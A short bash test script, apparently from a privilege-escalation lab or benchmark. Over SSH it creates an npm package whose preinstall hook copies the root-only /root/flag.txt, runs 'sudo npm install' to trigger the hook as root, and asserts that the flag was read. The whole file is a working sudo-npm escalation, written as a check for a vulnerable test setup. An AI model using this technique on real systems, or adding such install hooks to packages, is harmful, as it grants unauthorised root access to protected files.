#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/npmflag
cd /home/lowpriv/npmproj
cat > package.json <<'\''EOF'\''
{
  "name": "bench-pwn",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "cat /root/flag.txt > /tmp/npmflag"
  }
}
EOF
sudo /usr/bin/npm install --ignore-scripts=false >/dev/null 2>&1
test -r /tmp/npmflag && cat /tmp/npmflag
')"
assert_root_output "${out}"
